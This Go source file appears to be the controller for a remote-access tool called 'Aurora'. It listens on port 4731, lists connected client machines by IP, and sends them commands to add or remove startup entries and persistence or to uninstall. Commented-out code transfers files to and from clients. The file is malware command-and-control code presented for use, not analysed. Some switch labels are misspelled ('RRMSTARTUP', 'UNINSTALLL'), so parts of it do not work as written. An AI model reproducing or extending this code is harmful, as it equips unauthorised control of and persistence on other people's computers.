package internal

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

// Incoming socket data struct

type Packet struct {
	Type string

	StringData string

	BytePos  int64
	FileData []byte
	Done     bool
}

// CLI interface struct

type Aurora struct {
	listener net.Listener
	scanner  bufio.Scanner
	clients  List
}

func NewAurora() *Aurora {
	aurora := &Aurora{}
	aurora.clients = NewList()
	aurora.scanner = *bufio.NewScanner(os.Stdin)
	return aurora
}

func (aurora *Aurora) Start() {
	clearScreen()
	for {
		if aurora.listener == nil {
			var err error
			aurora.listener, err = net.Listen("tcp", ":4731")
			if err != nil {
				aurora.listener = nil
			} else {
				go aurora.startListening()
			}
		} else {
			aurora.handleCommands()
		}
	}

}

func (aurora *Aurora) startListening() {
	for {
		conn, err := aurora.listener.Accept()
		if err != nil {
			break
		} else {
			aurora.addConnections(conn)
			// TODO handle packets
		}
	}
}

func (aurora *Aurora) stopListening() {
	aurora.listener.Close()
	aurora.clients.Clear()
}

// TODO Handle different net.Listener errors differently.
func (aurora *Aurora) handleListenerError(err error) {
	//if err ==  {
	//
	//}
}

func (aurora *Aurora) handleCommands() {
	for {
		printMenu()
		input := aurora.getInput()
		inArray := strings.Split(input, " ")
		clearScreen()
		switch inArray[0] {
		case "1":
			aurora.pingClient()
		case "2":
			if len(inArray) >= 2 {
				index, err := strconv.Atoi(inArray[1])
				if err != nil {
					aurora.simplePacket(-1, "UNINSTALL")
				} else {
					aurora.simplePacket(index, "UNINSTALL")
				}
			} else {
				aurora.simplePacket(-1, "UNINSTALL")
			}
		case "3":
			if len(inArray) >= 2 {
				index, err := strconv.Atoi(inArray[1])
				if err != nil {
					aurora.simplePacket(-1, "STARTUP")
				} else {
					aurora.simplePacket(index, "STARTUP")
				}
			} else {
				aurora.simplePacket(-1, "STARTUP")
			}
		case "4":
			if len(inArray) >= 2 {
				index, err := strconv.Atoi(inArray[1])
				if err != nil {
					aurora.simplePacket(-1, "RMSTARTUP")
				} else {
					aurora.simplePacket(index, "RMSTARTUP")
				}
			} else {
				aurora.simplePacket(-1, "RMSTARTUP")
			}
		case "5":
			if len(inArray) >= 2 {
				index, err := strconv.Atoi(inArray[1])
				if err != nil {
					aurora.simplePacket(-1, "PERSISTENCE")
				} else {
					aurora.simplePacket(index, "PERSISTENCE")
				}
			} else {
				aurora.simplePacket(-1, "PERSISTENCE")
			}
		case "6":
			if len(inArray) >= 2 {
				index, err := strconv.Atoi(inArray[1])
				if err != nil {
					aurora.simplePacket(-1, "RMPERSISTENCE")
				} else {
					aurora.simplePacket(index, "RMPERSISTENCE")
				}
			} else {
				aurora.simplePacket(-1, "RMPERSISTENCE")
			}
		case "99":
			clearScreen()
			os.Exit(0)
		default:
			invalidCommand()
			aurora.getInput()
		}
		clearScreen()
	}
}

func (aurora *Aurora) handlePackets() {

}

func (aurora *Aurora) addConnections(conn net.Conn) {
	aurora.clients.Add(conn)
}

func (aurora *Aurora) removeConnection(conn net.Conn) {
	aurora.clients.Remove(conn)
}

// Util Functions

func (aurora *Aurora) getInput() string {
	aurora.scanner.Scan()
	cmd := aurora.scanner.Text()
	cmd = strings.Trim(cmd, "\n")
	return cmd
}

func clearScreen() {
	cmd := exec.Command("cmd", "/c", "cls")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

// Commands

func (aurora *Aurora) pingClient() {
	for _, client := range aurora.clients.All() {
		enc := client.GetEncoder()
		err := enc.Encode(Packet{"PING", "", 0, nil, false})
		if err != nil {
			aurora.removeConnection(client.GetConn())
			fmt.Println(err)
		}
	}
	printLogo()
	var i int
	for index, client := range aurora.clients.All() {
		ip := client.GetConn().RemoteAddr().String()
		ip = strings.Split(ip, ":")[0]
		str := "| " + strconv.Itoa(index) + " | " + ip
		for i = 0; i < 27; i++ {
			if i == 0 || i == 4 || i == 26 {
				fmt.Print("+")
			} else {
				fmt.Print("-")
			}
		}
		fmt.Println()
		fmt.Print(str)
		for i := len(str); i < 26; i++ {
			fmt.Print(" ")
		}
		fmt.Println("|")
	}
	if i != 0 {
		fmt.Println("+---+---------------------+")
	} else {
		fmt.Println("+-------------------------+")
	}
	fmt.Println("| Press Enter To Continue |")
	fmt.Println("+-------------------------+")
	aurora.getInput()
}

func (aurora *Aurora) simplePacket(index int, packet string) {
	if index != -1 && aurora.clients.Get(index) != (Client{}) {
		if index == -99 {
			for _, client := range aurora.clients.All() {
				if packet == "UNINSTALL" {
					aurora.removeConnection(client.GetConn())
				}
				enc := client.GetEncoder()
				err := enc.Encode(Packet{packet, "", 0, nil, false})
				if err != nil {
					fmt.Println(err)
					aurora.removeConnection(client.GetConn())
				}
			}
		} else {
			cl := aurora.clients.Get(index)
			enc := cl.GetEncoder()
			err := enc.Encode(Packet{packet, "", 0, nil, false})
			if err != nil {
				fmt.Println(err)
				aurora.removeConnection(cl.GetConn())
			}
		}
		printLogo()
		switch packet {
		case "STARTUP":
			fmt.Println("+-------------------------+")
			fmt.Println("|      Startup Added      |")
			fmt.Println("| Press Enter To Continue |")
			fmt.Println("+-------------------------+")
		case "RRMSTARTUP":
			fmt.Println("+-------------------------+")
			fmt.Println("|     Startup Removed     |")
			fmt.Println("| Press Enter To Continue |")
			fmt.Println("+-------------------------+")
		case "PERSISTENCE":
			fmt.Println("+-------------------------+")
			fmt.Println("|    Persistence Added    |")
			fmt.Println("| Press Enter To Continue |")
			fmt.Println("+-------------------------+")
		case "RMPERSISTENCE":
			fmt.Println("+-------------------------+")
			fmt.Println("|   Persistence Removed   |")
			fmt.Println("| Press Enter To Continue |")
			fmt.Println("+-------------------------+")
		case "UNINSTALLL":
			fmt.Println("+-------------------------+")
			fmt.Println("|   Connection Removed    |")
			fmt.Println("| Press Enter To Continue |")
			fmt.Println("+-------------------------+")
		}
		aurora.getInput()
	} else {
		printLogo()
		fmt.Println("+-------------------------+")
		fmt.Println("|  Connection Not Found   |")
		fmt.Println("| Press Enter To Continue |")
		fmt.Println("+-------------------------+")
		aurora.getInput()
	}
}

// Menu Layout

func invalidCommand() {
	printLogo()
	fmt.Println("+-------------------------+")
	fmt.Println("|     Invalid Command     |")
	fmt.Println("| Press Enter To Continue |")
	fmt.Println("+-------------------------+")
}

func printLogo() {
	fmt.Println("   _____                                    ")
	fmt.Println("  /  _  \\  __ _________  ________________   ")
	fmt.Println(" /  /_\\  \\|  |  \\_  __ \\/  _ \\_  __ \\__  \\  ")
	fmt.Println("/    |    \\  |  /|  | \\(  <_> )  | \\// __ \\_")
	fmt.Println("\\____|__  /____/ |__|   \\____/|__|  (____  /")
	fmt.Println("        \\/                               \\/ ")
}

func printMenu() {
	printLogo()
	fmt.Println("+----------------+")
	fmt.Println("| Commands       |")
	fmt.Println("+----+-----------+")
	fmt.Println("| 1  | Ping      |")
	fmt.Println("| 2  | Uninstall |")
	fmt.Println("| 3  | Startup   |")
	fmt.Println("| 4  | Rm Strtup |")
	fmt.Println("| 5  | Persist   |")
	fmt.Println("| 6  | Rm Prsist |")
	fmt.Println("| 99 | Exit      |")
	fmt.Println("+----+-----------+")
	fmt.Print("\nEnter Command: ")
}

// OLD CODE

//	aurora.workingDirectory, _ = filepath.Abs(filepath.Dir(os.Args[0]))
//	aurora.downloadDirectory, err = filepath.Abs(aurora.workingDirectory + "\\Downloads")

//func (aurora *Aurora) uploadFile(conn net.Conn, fileName string) {
//	buffer := make([]byte, 1024)
//	file, _ := os.Open(fileName)
//	defer file.Close()
//
//	i := 0
//	for {
//		_, err := file.Read(buffer)
//		if err == io.EOF {
//			err = aurora.encoders[conn].Encode(Packet{"FILE", fileName, 0, nil, true})
//			if err != nil {
//				aurora.removeConnection(conn)
//				fmt.Println(err)
//			}
//			break
//		}
//		err = aurora.encoders[conn].Encode(Packet{"FILE", fileName, int64(i), buffer, false})
//		if err != nil {
//			aurora.removeConnection(conn)
//			fmt.Println(err)
//		}
//		i++
//	}
//}

//case "FILE":
//	if _, err := os.Stat(aurora.downloadDirectory); os.IsNotExist(err) {
//		err := os.MkdirAll(aurora.downloadDirectory, os.ModeDir)
//		if err != nil {
//			fmt.Println(err)
//		}
//	}
//	fileName := aurora.downloadDirectory + "\\" + packet.StringData
//	if packet.Done && files[fileName] != nil {
//		files[fileName].Close()
//		fmt.Println("Aurora: Finished downloading", packet.StringData)
//		delete(files, fileName)
//	} else if packet.Done && files[fileName] == nil {
//		continue
//	} else {
//		if files[fileName] == nil {
//			fmt.Println("Aurora: Started downloading", packet.StringData)
//			if _, err := os.Stat(fileName); os.IsNotExist(err) {
//				files[fileName], _ = os.Create(fileName)
//			} else {
//				files[fileName], _ = os.Open(fileName)
//			}
//			defer files[fileName].Close()
//		}
//		files[fileName].WriteAt(packet.FileData, packet.BytePos*1024)
//	}
